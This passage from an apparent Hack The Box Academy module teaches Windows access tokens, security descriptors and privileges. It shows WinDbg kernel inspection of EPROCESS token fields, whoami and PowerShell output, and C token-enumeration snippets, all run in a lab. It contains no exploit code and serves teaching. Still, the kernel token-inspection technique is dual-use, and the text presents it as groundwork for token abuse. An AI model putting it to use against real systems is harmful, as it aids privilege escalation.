Evaluate expression: -109888702804192 = ffff9c0e`8ae78f20

```

After the bitwise AND operation, the address (0xffff9c0e8ae78f2e) & -0x10 will have its lowest 4 bits cleared, ensuring that it is correctly aligned for accessing the security descriptor. This alignment is crucial for reading the security descriptor's contents accurately and avoiding memory access issues. Then, the `!sd` command interprets the address provided as a pointer to a security descriptor structure and retrieves and displays the information contained within that structure.

![Evaluate](https://academy.hackthebox.com/storage/modules/256/sd6.png)

The above security descriptor for the winlogon process defines the access control settings, ensuring that only authorized users or groups can access the process and specifying the level of integrity required for accessing it.

- `Revision`: The revision number indicates the version of the security descriptor format being used. In this case, the revision is `0x1`, which is a standard revision for security descriptors in Windows.

- `Control`: The control field is a set of flags that specify various properties of the security descriptor. In this case, the flags indicate that the security descriptor contains a DACL ( `SE_DACL_PRESENT`), a SACL ( `SE_SACL_PRESENT`), the SACL is auto-inherited ( `SE_SACL_AUTO_INHERITED`), and the security descriptor is self-relative ( `SE_SELF_RELATIVE`).

- `Owner`: The owner of the winlogon process is identified by the SID `S-1-5-32-544`, which corresponds to the `Administrators group`.

- `Group`: The primary group of the winlogon process is identified by the SID `S-1-5-18`, which corresponds to the `Local System account`.

- `DACL (Discretionary Access Control List)`: The DACL contains two ACEs (Access Control Entries). The first ACE grants full access ( `0x001fffff`) to the Local System account ( `S-1-5-18`). The second ACE grants specific access ( `0x00121411`) to the Administrators group ( `S-1-5-32-544`).

- `SACL (System Access Control List)`: The SACL contains one ACE. This ACE specifies a `SYSTEM_MANDATORY_LABEL_ACE_TYPE`, indicating a `mandatory` integrity label. The mask `0x00000003` indicates the level of integrity required for accessing the object.


### PowerShell

The `Get-NtSecurityDescriptor` cmdlet in NTObjectManager is used to retrieve the security descriptor of an object in Windows. A security descriptor contains information about the security attributes of an object, such as its owner, primary group, Discretionary Access Control List (DACL), and System Access Control List (SACL).

```powershell
PS C:\> Get-NtSecurityDescriptor -ProcessId 4112 | ConvertTo-Json
{
    "Dacl":  [
                 {
                     "IsAllowedAce":  true,
                     "IsDeniedAce":  false,
                     "IsObjectAce":  false,
                     "IsCallbackAce":  false,
                     "IsConditionalAce":  false,
                     "IsResourceAttributeAce":  false,
                     "IsMandatoryLabel":  false,
                     "IsCompoundAce":  false,
                     "IsAuditAce":  false,
                     "IsAccessFilterAce":  false,
                     "IsProcessTrustLabelAce":  false,
                     "IsCriticalAce":  false,
                     "IsInheritOnly":  false,
                     "IsObjectInherit":  false,
                     "IsContainerInherit":  false,
                     "Type":  0,
                     "Flags":  0,
                     "Mask":  "2097151",
                     "Sid":  "S-1-5-21-1507357100-3087530421-3589589134-1105",
                     "CompoundAceType":  0,
                     "ServerSid":  null,
                     "ObjectType":  null,
                     "InheritedObjectType":  null,
                     "ApplicationData":  "",
...SNIP...
                 }
             ],
    "Sacl":  [
                 {
                     "Policy":  3,
                     "IntegrityLevel":  8192,
                     "IsAllowedAce":  false,
                     "IsDeniedAce":  false,
                     "IsObjectAce":  false,
                     "IsCallbackAce":  false,
                     "IsConditionalAce":  false,
                     "IsResourceAttributeAce":  false,
                     "IsMandatoryLabel":  true,
                     "IsCompoundAce":  false,
                     "IsAuditAce":  false,
                     "IsAccessFilterAce":  false,
                     "IsProcessTrustLabelAce":  false,
                     "IsCriticalAce":  false,
                     "IsInheritOnly":  false,
                     "IsObjectInherit":  false,
                     "IsContainerInherit":  false,
                     "Type":  17,
                     "Flags":  0,
                     "Mask":  "3",
                     "Sid":  "S-1-16-8192",
                     "CompoundAceType":  0,
                     "ServerSid":  null,
                     "ObjectType":  null,
                     "InheritedObjectType":  null,
                     "ApplicationData":  "",
                     "Condition":  "",
                     "ResourceAttribute":  null
                 }
             ],
    "Owner":  {
                  "Sid":  {
                              "Authority":  "Nt",
                              "SubAuthorities":  "21 1507357100 3087530421 3589589134 1105",
                              "Name":  "LEGACY\\normal.user",
                              "Parent":  "S-1-5-21-1507357100-3087530421-3589589134"
                          },
                  "Defaulted":  false
              },
    "Group":  {
                  "Sid":  {
                              "Authority":  "Nt",
                              "SubAuthorities":  "21 1507357100 3087530421 3589589134 513",
                              "Name":  "LEGACY\\Domain Users",
                              "Parent":  "S-1-5-21-1507357100-3087530421-3589589134"
                          },
                  "Defaulted":  false
              },
    "Control":  2068,
    "Revision":  1,
    "RmControl":  null,
...SNIP...

```

This covers the basic understanding of access tokens, security descriptors, and the access check process. By manipulating access tokens, attackers can bypass access controls and gain unauthorized access to resources or perform privileged operations on a system. We'll cover token abuse scenarios in the later sections.

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Token Privileges

Token privileges are a core component of access control in Windows. They define the actions that a process running under a certain security context is allowed to perform. Privileges include rights such as the ability to shut down the system, debug processes, or change the system time.

Each access token associated with a user or process contains a list of privileges that are granted to that user or process. These privileges are assigned based on the user's group membership, system policies, and other factors. When a process attempts to perform an action that requires a privilege, the system checks the token associated with the process to see if it holds the necessary privilege.

Privileges in the token determine what additional operations the process can perform beyond standard user rights (e.g., shutting down the system or debugging processes). These are stored in the `Privileges` field of the access token, represented in kernel structures as `SEP_TOKEN_PRIVILEGES`. In the list of privileges, we can see the associated states:

- `Enabled`: The privilege can be used by the process.
- `Disabled`: The privilege is present in the token but not active.

Privileges are identified by constants like `SeDebugPrivilege`, `SeShutdownPrivilege`, etc. Some of the examples of privileges are as follows:

- `SeDebugPrivilege`: Allows the process to debug other processes.
- `SeShutdownPrivilege`: Enables the process to shut down the computer.
- `SeImpersonatePrivilege`: Allows impersonating other users.
- `SeTakeOwnershipPrivilege`: Permits taking ownership of objects.

## Check Privileges

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools at the following paths:

- **Process Hacker**: `C:\Tools\ProcessHacker\ProcessHacker.exe`

The shortcut for WinDbg is saved on the Desktop, Start menu, as well as the taskbar.

* * *

We can check privileges in various ways depending on the tool or method we use. For example, `whoami /priv` is the easiest way to display privileges associated with the current user or process token.

```cmd-session
C:> whoami
legacy\normal.user

C:\Users\normal.user>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

```

The same information can be verified in Process Hacker as well. We can take the example of `explorer.exe`, which is running under the context of the standard user `LEGACY\normal.user`.

![Token Priv](https://academy.hackthebox.com/storage/modules/256/token-priv-ph_.png)

## Inspect Token Privileges in Windbg

If we want to view the token information in WinDbg, we need to get the memory address of the `EPROCESS` structure for `explorer.exe`. Then, we need to dump the structure and locate the Token field's offset. We'll then retrieve the pointer stored in the Token field and use the `!token` WinDbg command to analyze the token.

Find the `EPROCESS` of `explorer.exe`:

```cmd-session
lkd> !process 0 0 explorer.exe
PROCESS ffff8f02650b5080
    SessionId: 1  Cid: 0f44    Peb: 00650000  ParentCid: 0878
    DirBase: 12d2df000  ObjectTable: ffffa500aca1c480  HandleCount: 2156.
    Image: explorer.exe

```

Dump the EPROCESS structure to find the token. In the output, look for the offset of the `Token` field.

```cmd-session
lkd> dt nt!_EPROCESS ffff8f02650b5080
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`00000f44 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff8f02`65b4b368 - 0xffff8f02`65a375e8 ]
...SNIP...
   +0x350 ExceptionPortData : 0xffff8f02`61588090 Void
   +0x350 ExceptionPortValue : 0xffff8f02`61588090
   +0x350 ExceptionPortState : 0y000
   +0x358 Token            : _EX_FAST_REF
   +0x360 MmReserved       : 0
...SNIP...

```

The token field resides at offset `+0x358`. So, we can add this to the `_EPROCESS` address of explorer.exe. The expression `poi(...)` dereferences the memory at that field, retrieving the value stored there, i.e., the token structure.

```cmd-session
lkd> !token poi(ffff8f02650b5080 + 0x358)
The address 0xffffde0d7596f065 does not point to a token object.

```

It seems like there might be an issue reading the token object at the specified address. Token is actually of type `EX_FAST_REF`. In the `EX_FAST_REF` structure, 4 low-order bits are used to store a reference count or other information. By clearing these 4 bits, we ensure that the address points to the actual start of the token structure, allowing it to be correctly interpreted and processed in WinDbg by the `!token` function.

Similar to what we did in the previous section for the security descriptor structure, we'll clear the bits to ensure that the address points to the actual start of the token structure, allowing it to be correctly interpreted and processed in WinDbg by the `!token` function.

`poi(ffff8f02650b5080 + 0x358)` is the original address that represents a memory location where the token structure is stored for `explorer.exe`. We can use the hexadecimal value `0x10` as a mask to clear the lower 4 bits of the address. Performing a bitwise AND operation ( `&`) with this mask effectively sets the last 4 bits of the address to zero. We can evaluate the value that comes after the `AND` operation.

```cmd-session
lkd> ? (poi(ffff8f02650b5080 + 0x358) & -0x10)
Evaluate expression: -100052659228576 = ffffa500`acc9b060

```

After the bitwise AND operation, the address will have its lowest 4 bits cleared, ensuring that it is correctly aligned for accessing the token object. This alignment is required for reading the token's contents accurately and avoiding memory access issues. Then, the `!token` command interprets the address provided as a pointer to the token structure and retrieves and displays the information contained within that structure.

With the sanitized token address, we'll use the `!token` command to inspect it:

```cmd-session
lkd> !token ffffa500`acc9b060
_TOKEN 0xffffa500acc9b060
TS Session ID: 0x1
User: S-1-5-21-1507357100-3087530421-3589589134-1105
User Groups:
 00 S-1-5-21-1507357100-3087530421-3589589134-513
    Attributes - Mandatory Default Enabled
 01 S-1-1-0
    Attributes - Mandatory Default Enabled
 02 S-1-5-32-544
    Attributes - DenyOnly
 03 S-1-5-32-545
    Attributes - Mandatory Default Enabled
 04 S-1-5-4
    Attributes - Mandatory Default Enabled
 05 S-1-2-1
    Attributes - Mandatory Default Enabled
 06 S-1-5-11
    Attributes - Mandatory Default Enabled
 07 S-1-5-15
    Attributes - Mandatory Default Enabled
 08 S-1-5-5-0-218435
    Attributes - Mandatory Default Enabled LogonId
 09 S-1-2-0
    Attributes - Mandatory Default Enabled
 10 S-1-18-1
    Attributes - Mandatory Default Enabled
 11 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled
Primary Group: S-1-5-21-1507357100-3087530421-3589589134-513
Privs:
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes -
Authentication ID:         (0,355d9)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 ( Token in use )
Token ID: 3d032            ParentToken ID: 355dc
Modified ID:               (0, 355e5)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
PackageSid: (null)
CapabilityCount: 0      Capabilities: 0x0000000000000000
LowboxNumberEntry: 0x0000000000000000

...SNIP...

```

The above output shows what a token structure looks like for a normal user process running under the context of a standard primary token. As we can see, only the `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege` privileges are present, which is the same as the output from `whoami /priv`.

The screenshot below shows what information is present inside the token object. The information inside a Windows Server 2019 machine may vary compared to a Windows 10 machine due to the differences in the Windows kernel or security structures between the two operating systems.

![Token windbg](https://academy.hackthebox.com/storage/modules/256/token_windbg_.png)

## Check Administrator Privileges

We can run command prompt as an administrator and execute `whoami /priv` again. This time, it will show the privileges assigned to the Administrator user:

```cmd-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

```

To view a token structure for a user process running under the context of a linked administrator token, we can simply type `!token` in WinDbg to get the token information associated with the current process, which is running as an administrator. In this context, the token appears to be similar to a standard user token, but with significantly more privileges assigned. Essentially, all the privileges associated with an administrator user are assigned to this token.

```cmd-session
lkd> !token
Thread is not impersonating. Using process token...
_EPROCESS 0xffffd4032f6af080, _TOKEN 0x0000000000000000
TS Session ID: 0x2
User: S-1-5-21-1507357100-3087530421-3589589134-1105
User Groups:
 00 S-1-5-21-1507357100-3087530421-3589589134-513
    Attributes - Mandatory Default Enabled
 01 S-1-1-0
    Attributes - Mandatory Default Enabled
 02 S-1-5-32-544
    Attributes - Mandatory Default Enabled Owner
 03 S-1-5-32-545
    Attributes - Mandatory Default Enabled
 04 S-1-5-14
    Attributes - Mandatory Default Enabled
 05 S-1-5-4
    Attributes - Mandatory Default Enabled
 06 S-1-5-11
    Attributes - Mandatory Default Enabled
 07 S-1-5-15
    Attributes - Mandatory Default Enabled
 08 S-1-5-5-0-581798
    Attributes - Mandatory Default Enabled LogonId
 09 S-1-2-0
    Attributes - Mandatory Default Enabled
 10 S-1-18-1
    Attributes - Mandatory Default Enabled
 11 S-1-16-12288
    Attributes - GroupIntegrity GroupIntegrityEnabled
Primary Group: S-1-5-21-1507357100-3087530421-3589589134-513
Privs:
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes -
 08 0x000000008 SeSecurityPrivilege               Attributes -
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes -
 10 0x00000000a SeLoadDriverPrivilege             Attributes -
 11 0x00000000b SeSystemProfilePrivilege          Attributes -
 12 0x00000000c SeSystemtimePrivilege             Attributes -
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes -
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes -
 15 0x00000000f SeCreatePagefilePrivilege         Attributes -
 17 0x000000011 SeBackupPrivilege                 Attributes -
 18 0x000000012 SeRestorePrivilege                Attributes -
 19 0x000000013 SeShutdownPrivilege               Attributes -
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes -
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default
 24 0x000000018 SeRemoteShutdownPrivilege         Attributes -
 25 0x000000019 SeUndockPrivilege                 Attributes -
 28 0x00000001c SeManageVolumePrivilege           Attributes -
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes -
 34 0x000000022 SeTimeZonePrivilege               Attributes -
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes -
 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes -
Authentication ID:         (0,8e19a)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2a00 ( Token in use )
Token ID: 523680           ParentToken ID: 0
Modified ID:               (0, 523613)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000

...SNIP...

```

## Check Privileges using Powershell

The `Get-NtTokenPrivilege` cmdlet can be used to retrieve the privileges of a token.

```powershell
PS C:\> Get-NtTokenPrivilege

Name                          Luid              Enabled
----                          ----              -------
SeChangeNotifyPrivilege       00000000-00000017 True
SeIncreaseWorkingSetPrivilege 00000000-00000021 False

```

For an admin user, this shows more privileges, such as the following:

```powershell
PS C:\> Get-NtTokenPrivilege

Name                                      Luid              Enabled
----                                      ----              -------
SeIncreaseQuotaPrivilege                  00000000-00000005 False
SeSecurityPrivilege                       00000000-00000008 False
SeTakeOwnershipPrivilege                  00000000-00000009 False
SeLoadDriverPrivilege                     00000000-0000000A False
SeSystemProfilePrivilege                  00000000-0000000B False
SeSystemTimePrivilege                     00000000-0000000C False
SeProfileSingleProcessPrivilege           00000000-0000000D False
SeIncreaseBasePriorityPrivilege           00000000-0000000E False
SeCreatePageFilePrivilege                 00000000-0000000F False
SeBackupPrivilege                         00000000-00000011 False
SeRestorePrivilege                        00000000-00000012 False
SeShutdownPrivilege                       00000000-00000013 False
SeDebugPrivilege                          00000000-00000014 True
SeSystemEnvironmentPrivilege              00000000-00000016 False
SeChangeNotifyPrivilege                   00000000-00000017 True
SeRemoteShutdownPrivilege                 00000000-00000018 False
SeUndockPrivilege                         00000000-00000019 False
SeManageVolumePrivilege                   00000000-0000001C False
SeImpersonatePrivilege                    00000000-0000001D True
SeCreateGlobalPrivilege                   00000000-0000001E True
SeIncreaseWorkingSetPrivilege             00000000-00000021 False
SeTimeZonePrivilege                       00000000-00000022 False
SeCreateSymbolicLinkPrivilege             00000000-00000023 False
SeDelegateSessionUserImpersonatePrivilege 00000000-00000024 False
]

```

Privilege constants represent various privileges that can be assigned to users or groups. These privileges define specific actions or operations that a user or process can perform on the system. Below is the list of privilege constants documented by [Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

| Privilege Constant | Description |
| --- | --- |
| `SeAssignPrimaryTokenPrivilege` | Required to assign the primary token of a process. |
| `SeAuditPrivilege` | Required to generate audit-log entries. |
| `SeBackupPrivilege` | Required to perform backup operations. |
| `SeChangeNotifyPrivilege` | Required to receive notifications of changes to files or directories. Enabled by default for all users. |
| `SeCreateGlobalPrivilege` | Required to create named file mapping objects in the global namespace during Terminal Services sessions. Enabled by default for administrators, services, and the local system account. |
| `SeCreatePagefilePrivilege` | Required to create a paging file. |
| `SeCreatePermanentPrivilege` | Required to create a permanent object. |
| `SeCreateSymbolicLinkPrivilege` | Required to create a symbolic link. |
| `SeCreateTokenPrivilege` | Required to create a primary token. |
| `SeDebugPrivilege` | Required to debug and adjust the memory of a process owned by another account. |
| `SeDelegateSessionUserImpersonatePrivilege` | Required to obtain an impersonation token for another user in the same session. |
| `SeEnableDelegationPrivilege` | Required to mark user and computer accounts as trusted for delegation. |
| `SeImpersonatePrivilege` | Required to impersonate. |
| `SeIncreaseBasePriorityPrivilege` | Required to increase the base priority of a process. |
| `SeIncreaseQuotaPrivilege` | Required to increase the quota assigned to a process. |
| `SeIncreaseWorkingSetPrivilege` | Required to allocate more memory for applications that run in the context of users. |
| `SeLoadDriverPrivilege` | Required to load or unload a device driver. |
| `SeLockMemoryPrivilege` | Required to lock physical pages in memory. |
| `SeMachineAccountPrivilege` | Required to create a computer account. |
| `SeManageVolumePrivilege` | Required to enable volume management privileges. |
| `SeProfileSingleProcessPrivilege` | Required to gather profiling information for a single process. |
| `SeRelabelPrivilege` | Required to modify the mandatory integrity level of an object. |
| `SeRemoteShutdownPrivilege` | Required to shut down a system using a network request. |
| `SeRestorePrivilege` | Required to perform restore operations. |
| `SeShutdownPrivilege` | Required to shut down a local system. |
| `SeSyncAgentPrivilege` | Required for a domain controller to use the Lightweight Directory Access Protocol directory synchronization services. |
| `SeSystemEnvironmentPrivilege` | Required to modify the nonvolatile RAM of systems that use this type of memory to store configuration information. |
| `SeSystemProfilePrivilege` | Required to gather profiling information for the entire system. |
| `SeSystemtimePrivilege` | Required to modify the system time. |
| `SeTakeOwnershipPrivilege` | Required to take ownership of an object without being granted discretionary access. |
| `SeTcbPrivilege` | This privilege identifies its holder as part of the trusted computer base. Some trusted protected subsystems are granted this privilege. |
| `SeTimeZonePrivilege` | Required to adjust the time zone associated with the computer's internal clock. |
| `SeTrustedCredManAccessPrivilege` | Required to access Credential Manager as a trusted caller. |
| `SeUndockPrivilege` | Required to undock a laptop. |
| `SeUnsolicitedInputPrivilege` | Required to read unsolicited input from a terminal device. |

More details about the privilege constants are explained by Microsoft at [https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).

* * *

Note: Please wait for 2-3 minutes after the target spawns before connecting to ensure the Active Directory domain environment and services are properly configured.

* * *


# Token Enumeration

Token enumeration is the process of identifying and listing the access tokens associated with a process or user account on a Windows system. Access tokens contain security information, including user account details, privileges, and other security attributes. The primary goal of token enumeration is to gain insights into the security context of processes and user accounts. By enumerating and analyzing access tokens, we can understand the privileges and permissions associated with a particular process or user account.

Typically, the enumeration process involves using Windows API functions like `OpenProcessToken()` and `GetTokenInformation()` to retrieve and analyze access token information. These functions allow us to retrieve various types of token information, such as user account details, privileges, impersonation level, and more.

## Open Process Token

The [OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken) function is used to obtain an access token for a specified process. This function takes two arguments: the process handle and the desired access rights.

The syntax of this function is as follows:

```cmd-session
BOOL OpenProcessToken(
  [in]  HANDLE  ProcessHandle,
  [in]  DWORD   DesiredAccess,
  [out] PHANDLE TokenHandle
);

```

Here's an example usage of the `OpenProcessToken()` function in C:

```c
#include <windows.h>

HANDLE hToken;
BOOL success = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
if (success) {
    // Token handle acquired, perform operations with hToken
    ...
    CloseHandle(hToken);
} else {
    // Error handling
}

```

In this example, we're obtaining the access token for the current process with `TOKEN_QUERY` access rights, which allow us to query the token for information.

## Get Token Information

Once we have the token handle, we can use the [GetTokenInformation()](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) function to retrieve various types of information about the token. This function requires a `TOKEN_INFORMATION_CLASS` parameter, which specifies the type of information to return.

The syntax of this function is as follows:

```cmd-session
BOOL GetTokenInformation(
  [in]            HANDLE                  TokenHandle,
  [in]            TOKEN_INFORMATION_CLASS TokenInformationClass,
  [out, optional] LPVOID                  TokenInformation,
  [in]            DWORD                   TokenInformationLength,
  [out]           PDWORD                  ReturnLength
);

```

Here's an example usage of the `GetTokenInformation()` function in C:

```c
GetTokenInformation(hToken, TokenUser, NULL, 0, &returnLength);
pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, returnLength);
if (!GetTokenInformation(hToken, TokenUser, pTokenUser, returnLength, &returnLength)) {
   printf("GetTokenInformation (TokenUser) failed. Error: %u\n", GetLastError());
    LocalFree(pTokenUser);
    CloseHandle(hToken);
    return 1;
}

```

In this example, we're retrieving the user information (TokenUser) associated with the token. Some other commonly used `TOKEN_INFORMATION_CLASS` values include:

- `TokenPrivileges`: Retrieves the privileges associated with the token.
- `TokenType`: Retrieves the type of the token (primary or impersonation).
- `TokenImpersonationLevel`: Retrieves the impersonation level of the token.

## Token Enumeration for Non-Administrator User

When enumerating the access token of a non-administrator user account, the privileges and information available will typically be limited. We'll run our custom program to enumerate the token information for the non-administrator user.

Let's navigate to the bottom of this section and click on "Click here to spawn the target system!". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the tools and samples at the following path:

- **Token Enumeration**: `C:\Tools\token-enumeration.exe`

To perform this, browse the location of the sample, and run it from a non-administrative command prompt session.

```cmd-session
C:\> C:\tools\token-enumeration.exe

[+] Opened process token using OpenProcessToken(GetCurrentProcess())

[+] Retrieved "TokenUser" information using GetTokenInformation()
      [+] Token User Information:
           -> User : LEGACY\normal.user
           -> SID  : S-1-5-21-1507357100-3087530421-3589589134-1105

[+] Retrieved "TokenPrivileges" information using GetTokenInformation()
      [+] Token Privileges:
          -> Privilege: SeChangeNotifyPrivilege (Attributes: 0x3)
          -> Privilege: SeIncreaseWorkingSetPrivilege (Attributes: 0x0)

[+] Retrieved "TokenType" information using GetTokenInformation()
      [+] Token Type Information:
          -> Token Type: Primary

```

In the output, we might observe:

- `User Account Details`: The token will contain the user account information, such as the user's security identifier (SID), username, and domain or computer name.

- `Limited Privileges`: Non-administrator users generally have fewer privileges assigned to their access tokens. Common privileges for standard user accounts may include `SeChangeNotifyPrivilege`, `SeUndockPrivilege`, and `SeIncreaseWorkingSetPrivilege`, among others.

- `Restricted Access`: The token may not grant access to sensitive system resources or information, as non-administrator users have limited access by design.


## Token Enumeration for Administrator User

In the case of access token enumeration for an administrator user account, we typically observe a broader set of privileges and information. In the output shown below, we executed our sample token enumeration program from an elevated command prompt to enumerate the token information for the admin user. In the output, we might observe:

- `User Account Details`: Similar to non-administrator users, the token will contain the user account information, including the SID, username, and domain or computer name.

- `Elevated Privileges`: Administrator user accounts typically have a broader set of privileges assigned to their access tokens. These privileges may include `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others, granting elevated access and capabilities.

- `Sensitive Access`: The token may grant access to sensitive system resources, files, and information that are restricted for non-administrator users.


```cmd-session
C:\> C:\tools\token-enumeration.exe

[+] Opened process token using OpenProcessToken(GetCurrentProcess())

[+] Retrieved "TokenUser" information using GetTokenInformation()
      [+] Token User Information:
           -> User : LEGACY\normal.user
           -> SID  : S-1-5-21-1507357100-3087530421-3589589134-1105

[+] Retrieved "TokenPrivileges" information using GetTokenInformation()
      [+] Token Privileges:
          -> Privilege: SeIncreaseQuotaPrivilege (Attributes: 0x0)
          -> Privilege: SeSecurityPrivilege (Attributes: 0x0)
          -> Privilege: SeTakeOwnershipPrivilege (Attributes: 0x0)
          -> Privilege: SeLoadDriverPrivilege (Attributes: 0x0)
          -> Privilege: SeSystemProfilePrivilege (Attributes: 0x0)
          -> Privilege: SeSystemtimePrivilege (Attributes: 0x0)
          -> Privilege: SeProfileSingleProcessPrivilege (Attributes: 0x0)
          -> Privilege: SeIncreaseBasePriorityPrivilege (Attributes: 0x0)
          -> Privilege: SeCreatePagefilePrivilege (Attributes: 0x0)
          -> Privilege: SeBackupPrivilege (Attributes: 0x0)
          -> Privilege: SeRestorePrivilege (Attributes: 0x0)
          -> Privilege: SeShutdownPrivilege (Attributes: 0x0)
          -> Privilege: SeDebugPrivilege (Attributes: 0x0)
          -> Privilege: SeSystemEnvironmentPrivilege (Attributes: 0x0)
          -> Privilege: SeChangeNotifyPrivilege (Attributes: 0x3)
          -> Privilege: SeRemoteShutdownPrivilege (Attributes: 0x0)
          -> Privilege: SeUndockPrivilege (Attributes: 0x0)
          -> Privilege: SeManageVolumePrivilege (Attributes: 0x0)
          -> Privilege: SeImpersonatePrivilege (Attributes: 0x3)
          -> Privilege: SeCreateGlobalPrivilege (Attributes: 0x3)
          -> Privilege: SeIncreaseWorkingSetPrivilege (Attributes: 0x0)
          -> Privilege: SeTimeZonePrivilege (Attributes: 0x0)
          -> Privilege: SeCreateSymbolicLinkPrivilege (Attributes: 0x0)
          -> Privilege: SeDelegateSessionUserImpersonatePrivilege (Attributes: 0x0)

[+] Retrieved "TokenType" information using GetTokenInformation()
      [+] Token Type Information:
          -> Token Type: Primary

```

## Token Enumeration using Powershell

The `NTObjectManager` PowerShell module provides comprehensive utilities for managing and inspecting Windows objects, including access tokens. The `Get-NtToken` cmdlet specifically retrieves and displays detailed information about access tokens associated with processes, threads, or specific token handles.

Here's an example of getting information about a token related to a specific process ID:

```powershell
PS C:\> Get-NtToken -ProcessId 2144

User                GroupCount PrivilegeCount AppContainer Restricted
----                ---------- -------------- ------------ ----------
NT AUTHORITY\SYSTEM 4          21             False        False

PS C:\> Get-NtToken -ProcessId 2000

User               GroupCount PrivilegeCount AppContainer Restricted
----               ---------- -------------- ------------ ----------
LEGACY\normal.user 12         24             False        False

```

We can

```powershell
PS C:\> Get-NtToken -ProcessId 2000 | ConvertTo-Json |more
{
    "User":  {
                 "Sid":  {
                             "Authority":  "Nt",
                             "SubAuthorities":  "21 1507357100 3087530421 3589589134 1105",
                             "Name":  "LEGACY\\normal.user",
                             "Parent":  "S-1-5-21-1507357100-3087530421-3589589134"
                         },
                 "Attributes":  0,
                 "Enabled":  false,
                 "Mandatory":  false,
                 "DenyOnly":  false,
                 "Name":  "LEGACY\\normal.user"
             },
    "Groups":  [
                   {
                       "Sid":  "S-1-5-21-1507357100-3087530421-3589589134-513",
                       "Attributes":  7,
                       "Enabled":  true,
                       "Mandatory":  true,
                       "DenyOnly":  false,
                       "Name":  "LEGACY\\Domain Users"
                   },
...SNIP...
                   {
                       "Sid":  "S-1-16-12288",
                       "Attributes":  96,
                       "Enabled":  false,
                       "Mandatory":  false,
                       "DenyOnly":  false,
                       "Name":  "Mandatory Label\\High Mandatory Level"
                   }
               ],
    "EnabledGroups":  [
                          {
...SNIP...
                          },
                          {
                              "Sid":  "S-1-18-1",
                              "Attributes":  7,
                              "Enabled":  true,
                              "Mandatory":  true,
                              "DenyOnly":  false,
                              "Name":  "Authentication authority asserted identity"
                          }
                      ],
    "DenyOnlyGroups":  [

                       ],
    "GroupCount":  12,
